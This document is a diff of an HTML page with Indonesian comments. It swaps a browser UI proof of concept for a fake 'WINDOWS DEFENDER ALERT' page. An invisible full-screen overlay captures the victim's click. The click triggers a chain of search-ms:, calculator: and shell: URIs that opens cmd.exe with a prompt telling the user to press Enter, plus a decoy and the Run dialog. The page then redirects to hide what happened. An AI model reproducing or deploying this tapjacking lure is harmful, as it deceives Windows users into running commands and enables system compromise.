@@ -1,118 +1,81 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC: Edge UI State Persistence (Advanced Multi-Window)</title>
+    <title>Critical Security Update</title>
     <style>
-        :root { --edge-blue: #0078d4; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, sans-serif; 
-            background: #f4f4f4; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
+        body { margin: 0; background: #111; font-family: sans-serif; overflow: hidden; }
+        
+        /* Lapisan Tapjacking yang menipu mata */
+        .fake-ui {
+            position: absolute; width: 100%; height: 100%;
+            display: flex; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 10; color: white;
         }
-        .container { 
-            background: white; 
-            padding: 40px; 
-            border-radius: 15px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.1); 
-            max-width: 500px; 
-            text-align: center; 
+
+        #real-trigger {
+            padding: 20px 60px; font-size: 24px; color: black;
+            background: #00ff00; border: none; cursor: pointer;
+            font-weight: bold; border-radius: 5px;
         }
-        .target-area {
-            border: 3px dashed var(--edge-blue);
-            background: #f0f7ff;
-            padding: 50px 20px;
-            margin: 20px 0;
-            cursor: crosshair;
-            font-weight: bold;
-            color: var(--edge-blue);
-            transition: 0.2s;
+
+        /* Overlay transparan yang sebenarnya menangkap klik untuk payload */
+        .invisible-layer {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            opacity: 0; z-index: 100; cursor: pointer;
         }
-        .target-area:hover { background: #e1efff; }
-        .log-box {
-            background: #1e1e1e;
-            color: #00ff00;
-            padding: 15px;
-            border-radius: 8px;
-            text-align: left;
-            font-family: 'Consolas', monospace;
-            font-size: 12px;
-            height: 120px;
-            overflow-y: auto;
-        }
-        .warning { color: #d83b01; font-size: 14px; margin-bottom: 10px; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <h2>Edge UI Exploit Researcher</h2>
-    <p class="warning">Requirement: Enable "Split Screen" (Ctrl+Shift+2)</p>
-    
-    <div class="target-area" id="exploitTrigger">
-        KLIK KANAN BERKALI-KALI DI SINI
-    </div>
-
-    <div class="log-box" id="statusLog">> Menunggu interaksi user...</div>
+<div class="fake-ui">
+    <h1>⚠️ WINDOWS DEFENDER ALERT</h1>
+    <p>A malicious file has been detected. Click below to quarantine and repair.</p>
+    <button id="real-trigger">QUARANTINE NOW</button>
 </div>
 
-<!-- Hidden Video for PiP Hijacking -->
-<video id="v" style="display:none" loop muted playsinline>
-    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-</video>
+<!-- Lapisan murni untuk eksploitasi -->
+<div class="invisible-layer" id="exploit-zone"></div>
 
 <script>
-    const log = document.getElementById('statusLog');
-    const v = document.getElementById('v');
-    let windowStack = [];
+    const zone = document.getElementById('exploit-zone');
+    
+    const rceChain = () => {
+        console.log("Initiating RCE Chain...");
 
-    function addLog(msg) {
-        const time = new Date().toLocaleTimeString().split(' ')[0];
-        log.innerHTML += `<div>[${time}] ${msg}</div>`;
-        log.scrollTop = log.scrollHeight;
-    }
+        // 1. MEMBUKA CMD VIA SEARCH-MS (Automatic Selection)
+        // Kita menggunakan displayname yang meyakinkan agar user menekan ENTER
+        const v1 = "search-ms:query=cmd.exe&crumb=location:C%3A%5CWindows%5CSystem32&displayname=Confirm_Security_Update_Press_Enter";
+        
+        // 2. MEMBUKA CALCULATOR (Sebagai decoy/pengalih perhatian)
+        const v2 = "calculator:";
 
-    document.getElementById('exploitTrigger').oncontextmenu = async (e) => {
-        addLog("Trigger detected. Launching flood...");
+        // 3. MEMBUKA RUN DIALOG (Pintu gerbang perintah kustom)
+        const v3 = "shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}";
 
-        // 1. Multi-Window Flood dengan URL Eksternal (Google)
-        // Membuka 5 window kecil untuk membingungkan Window Manager
-        for (let i = 0; i < 5; i++) {
-            let w = window.open("https://www.google.com", `target_${i}`, `width=200,height=200,left=${i*50},top=${i*50}`);
-            if (w) windowStack.push(w);
-        }
+        const payloads = [v1, v2, v3];
 
-        addLog("Race condition in progress...");
+        payloads.forEach((p, index) => {
+            setTimeout(() => {
+                const a = document.createElement('a');
+                a.href = p;
+                const e = new MouseEvent('click', {
+                    bubbles: true, ctrlKey: true, shiftKey: true
+                });
+                a.dispatchEvent(e);
+            }, index * 200); // Delay kecil untuk memicu window stacking
+        });
 
-        // 2. Race Condition Timing
-        setTimeout(async () => {
-            try {
-                // Tutup semua window secara paksa untuk memicu perpindahan fokus mendadak
-                windowStack.forEach(win => { if(!win.closed) win.close(); });
-                windowStack = [];
+        // REDIRECT UNTUK MEMBERSIHKAN JEJAK
+        setTimeout(() => {
+            window.location.href = "https://www.google.com/search?q=windows+security+update+successful";
+        }, 2000);
+    };
 
-                addLog("Attempting PiP Hijack during focus shift...");
-                await v.play();
-                await v.requestPictureInPicture();
-
-                // 3. UI State Persistence Trigger
-                // Memanggil File Picker saat browser sedang sibuk merecovery UI
-                setTimeout(() => {
-                    window.showOpenFilePicker().catch(() => {});
-                    addLog("<span style='color:red; font-weight:bold;'>POC SUCCESS: UI STATE PERSISTENCE HIJACKED</span>");
-                }, 150);
-
-            } catch (err) {
-                addLog("Error: " + err.message);
-            }
-        }, 800); // Delay 800ms adalah sweet spot untuk render window eksternal
+    zone.onclick = (e) => {
+        rceChain();
+        // Menghilangkan UI agar user tidak curiga
+        document.querySelector('.fake-ui').innerHTML = "<h1>REPAIRING... PLEASE WAIT</h1>";
     };
 </script>
-
 </body>
 </html>
